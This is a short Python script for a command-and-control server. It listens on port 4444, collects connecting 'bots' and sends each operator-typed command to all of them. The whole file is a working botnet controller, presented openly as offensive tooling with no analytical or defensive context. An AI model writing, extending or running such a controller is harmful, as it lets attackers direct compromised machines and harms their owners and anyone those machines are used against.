import socket

server_ip = '0.0.0.0'
server_port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((server_ip, server_port))
server.listen(5)

print(f"[+] C2 Server listening on {server_ip}:{server_port}")

bots = []

try:
	while True:
		client, addr = server.accept()
		print(f"[+] Bot connected from {addr}")
		bots.append(client)

		# Send command to bot
		cmd = input("Command to send to bot: ")
		for bot in bots:
			try:
				bot.send(cmd.encode())
			except:
				bots.remove(bot)
except KeyboardInterrupt:
	print("\n[!] C2 Server shutting down.")
	for b in bots:
		b.close()
	server.close()
